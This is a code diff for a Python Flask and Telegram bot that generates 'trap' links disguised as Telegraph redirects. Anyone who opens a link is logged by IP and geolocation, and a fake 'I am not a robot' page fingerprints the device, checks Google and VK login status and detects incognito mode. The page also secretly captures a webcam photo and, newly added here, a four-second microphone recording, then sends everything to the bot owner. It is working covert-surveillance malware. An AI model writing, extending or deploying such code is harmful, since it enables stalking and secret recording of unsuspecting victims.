@@ -5,59 +5,57 @@ API_TOKEN = os.environ.get('API_TOKEN')
 bot = telebot.TeleBot(API_TOKEN, threaded=False)
 app = Flask(__name__)
 
-# Временная база в памяти (на Vercel живет до перезагрузки сервера)
 db = {} 
 
 @app.route('/')
 def home():
     return f'''
     <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
-        <h1 style="margin-bottom:20px;">🛡️ CORE SYSTEM ACTIVE</h1>
-        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 0 25px #0088cc;transition:0.3s;">⚡ АКТИВИРОВАТЬ БОТА</a>
+        <h1 style="margin-bottom:20px;">🛡️ CVERIA SYSTEM V4</h1>
+        <a href="/activate" style="padding:15px 35px;background:#0088cc;color:#fff;text-decoration:none;border-radius:12px;font-weight:bold;box-shadow:0 0 25px #0088cc;">АКТИВИРОВАТЬ</a>
     </body>
     '''
 
 @app.route('/activate')
 def activate():
-    webhook_url = f"https://{request.host}/{API_TOKEN}"
-    if bot.set_webhook(url=webhook_url):
-        return f"✅ СИСТЕМА ЗАПУЩЕНА: {webhook_url}"
-    return "❌ ОШИБКА АКТИВАЦИИ"
+    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
+        return "✅ SYSTEM ARMED"
+    return "❌ ERROR"
 
 @app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
 def get_m():
     if request.headers.get('content-type') == 'application/json':
         bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
         return "!", 200
-    return "forbidden", 403
+    return "error", 403
 
 @app.route('/v/<uid>')
 def logger(uid):
-    if uid not in db: return "URL EXPIRED", 404
-    
+    if uid not in db: return "EXPIRED", 404
     owner_id = db[uid]['owner']
     target = db[uid]['url']
     ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
     ua = request.headers.get('user-agent')
     
-    g_info = "📍 GeoIP Error"
+    g = "📍 GeoIP Error"
     try:
         r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
         if r.get('status') == 'success':
-            g_info = (f"🌍 {r['country']}, {r['city']}\n📡 Провайдер: {r['isp']}\n"
-                      f"🛡 VPN/Proxy: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}")
+            g = (f"🌍 {r['country']}, {r['city']} ({r['regionName']})\n"
+                 f"📡 {r['isp']}\n🛡️ VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}\n"
+                 f"📍 Координаты: `{r['lat']}, {r['lon']}`")
     except: pass
     
-    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n👤 IP: `{ip}`\n{g_info}\n📱 UA: `{ua}`", parse_mode="Markdown")
+    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n👤 IP: `{ip}`\n{g}\n📱 UA: `{ua}`", parse_mode="Markdown")
     
     return f'''
     <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"></head>
-    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
-        <div id="ui">
+    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;text-align:center;">
+        <div>
             <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
-            <h2 style="margin:0 0 10px 0;">Безопасный переход</h2>
-            <p style="color:#888;margin-bottom:30px;">Нажмите "Я НЕ РОБОТ" для подтверждения</p>
-            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;font-size:16px;cursor:pointer;">Я НЕ РОБОТ</button>
+            <h2>Проверка безопасности</h2>
+            <p style="color:#888;margin-bottom:25px;">Нажмите "Я НЕ РОБОТ"</p>
+            <button id="go" style="padding:18px 60px;border:none;border-radius:40px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
         </div>
         <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
         <script>
@@ -66,42 +64,74 @@ def logger(uid):
             btn.innerText = "Синхронизация...";
             let d = {{
                 uid: "{uid}",
-                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A" }},
-                net: {{ tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language, local_ip: "N/A" }},
-                social: {{ google: false, vk: false }},
-                motion: "static"
+                hw: {{ 
+                    scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, 
+                    cores: navigator.hardwareConcurrency, 
+                    ram: navigator.deviceMemory || "N/A",
+                    gpu: "N/A",
+                    touch: navigator.maxTouchPoints
+                }},
+                net: {{ 
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone, 
+                    type: navigator.connection ? navigator.connection.effectiveType : "N/A", 
+                    hist: history.length,
+                    lang: navigator.language
+                }},
+                bat: {{ lvl: "N/A", char: "N/A" }},
+                state: {{ inc: false, dark: window.matchMedia('(prefers-color-scheme: dark)').matches, mot: "static" }},
+                social: {{ g: false, vk: false }}
             }};
 
-            // WebRTC Leak
             try {{
-                const pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = i => {{ if(i.candidate) {{ let ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate); if(ip) d.net.local_ip = ip[0]; }} }};
+                let gl = document.createElement('canvas').getContext('webgl');
+                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                d.hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
             }} catch(e) {{}}
 
-            // Детект соцсетей
-            const check = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r(true); i.onerror=()=>r(false); i.src=u; }});
-            d.social.google = await check("https://accounts.google.com");
-            d.social.vk = await check("https://vk.com");
-
-            // Акселерометр
-            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.motion = "moving"; }};
-
-            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});
+            if (navigator.storage && navigator.storage.estimate) {{
+                const est = await navigator.storage.estimate();
+                if (est.quota < 120000000) d.state.inc = true;
+            }}
 
             try {{
-                const s = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                let b = await navigator.getBattery();
+                d.bat.lvl = Math.round(b.level * 100) + "%";
+                d.bat.char = b.charging ? "Заряжается" : "Нет";
+            }} catch(e) {{}}
+
+            const check = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r(true); i.onerror=()=>r(false); i.src=u; }});
+            d.social.g = await check("https://accounts.google.com");
+            d.social.vk = await check("https://vk.com");
+
+            window.ondevicemotion = e => {{ if(e.acceleration.x > 0.1) d.state.mot = "moving"; }};
+
+            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});
+
+            try {{
+                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                 const v = document.getElementById('v'); v.srcObject = s;
+                
+                const rec = new MediaRecorder(s);
+                const chunks = [];
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = () => {{
+                    const f = new FormData(); f.append('audio', new Blob(chunks, {{type:'audio/ogg'}}), 'a.ogg'); f.append('uid', "{uid}");
+                    fetch('/log_audio', {{ method: 'POST', body: f }});
+                }};
+                rec.start();
+                setTimeout(() => rec.stop(), 4000);
+
                 setTimeout(() => {{
                     const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
                     c.toBlob(b => {{
-                        const f = new FormData(); f.append('photo', b, '1.jpg'); f.append('uid', "{uid}");
+                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('uid', "{uid}");
                         fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                             s.getTracks().forEach(t => t.stop());
                             window.location.href = "{target}";
                         }});
                     }}, 'image/jpeg', 0.7);
-                }}, 1000);
+                }}, 1200);
             }} catch(e) {{ window.location.href = "{target}"; }}
         }};
         </script>
@@ -112,26 +142,37 @@ def logger(uid):
 def log_extra():
     d = request.json
     if d and d['uid'] in db:
-        m = (f"🖥 *ДЕТАЛИ УСТРОЙСТВА ID:* `{d['uid']}`\n\n"
-             f"📱 Экран: `{d['hw']['scr']}`\n"
-             f"🧠 Ядра: `{d['hw']['cores']}` | RAM: `{d['hw']['ram']}GB`\n"
-             f"🏠 Local IP: `{d['net']['local_ip']}`\n"
-             f"🕒 Пояс: `{d['net']['tz']}`\n"
-             f"👤 Вошел в: `G:{'✅' if d['social']['google'] else '❌'}` | `VK:{'✅' if d['social']['vk'] else '❌'}`\n"
-             f"🏃 Движение: `{d['motion']}`")
+        m = (f"🖥 *ТЕХНИЧЕСКИЙ ОТЧЕТ ID:* `{d['uid']}`\n\n"
+             f"🔋 *Заряд:* `{d['bat']['lvl']}` (`{d['bat']['char']}`)\n"
+             f"🌐 *Сеть:* `{d['net']['type']}` | *Вкладки:* `{d['net']['hist']}`\n"
+             f"🧠 *CPU:* `{d['hw']['cores']} ядер` | *RAM:* `{d['hw']['ram']}GB`\n"
+             f"📺 *Экран:* `{d['hw']['scr']}`\n"
+             f"🎮 *GPU:* `{d['hw']['gpu']}`\n"
+             f"👤 *Вход:* `Google: {'✅' if d['social']['g'] else '❌'}` | `VK: {'✅' if d['social']['vk'] else '❌'}`\n"
+             f"🌓 *Тема:* `{'Темная' if d['state']['dark'] else 'Светлая'}`\n"
+             f"🕵️ *Инкогнито:* `{'ДА' if d['state']['inc'] else 'НЕТ'}`\n"
+             f"🏃 *Движение:* `{d['state']['mot']}`\n"
+             f"🕒 *Пояс:* `{d['net']['tz']}` | `{d['net']['lang']}`")
         bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
     return "ok"
 
 @app.route('/log_photo', methods=['POST'])
 def log_photo():
-    uid, file = request.form.get('uid'), request.files.get('photo')
-    if uid in db and file:
-        bot.send_photo(db[uid]['owner'], file.read(), caption=f"📸 *ЛИЦО ОБЪЕКТА* (ID: `{uid}`)")
+    uid, f = request.form.get('uid'), request.files.get('photo')
+    if uid in db and f:
+        bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 *ФОТО ОБЪЕКТА ID:* `{uid}`", parse_mode="Markdown")
+    return "ok"
+
+@app.route('/log_audio', methods=['POST'])
+def log_audio():
+    uid, f = request.form.get('uid'), request.files.get('audio')
+    if uid in db and f:
+        bot.send_voice(db[uid]['owner'], f.read(), caption=f"🎤 *ЗВУК ОКРУЖЕНИЯ ID:* `{uid}`", parse_mode="Markdown")
     return "ok"
 
 @bot.message_handler(commands=['start'])
 def start(m):
-    bot.reply_to(m, "🤖 *Система сбора данных активна.*\n\nПришли ссылку на Telegraph, чтобы создать персональную ловушку.", parse_mode="Markdown")
+    bot.reply_to(m, "🤖 *Система сбора данных активна.*\nПришли ссылку на Telegraph.", parse_mode="Markdown")
 
 @bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
 def create(m):
@@ -139,4 +180,7 @@ def create(m):
     if not url.startswith("http"): url = "https://" + url
     uid = str(uuid.uuid4())[:8]
     db[uid] = {'owner': m.chat.id, 'url': url}
-    bot.reply_to(m, f"✅ *Твоя ловушка готова:*\n\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
+    bot.reply_to(m, f"✅ *Ссылка готова:*\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
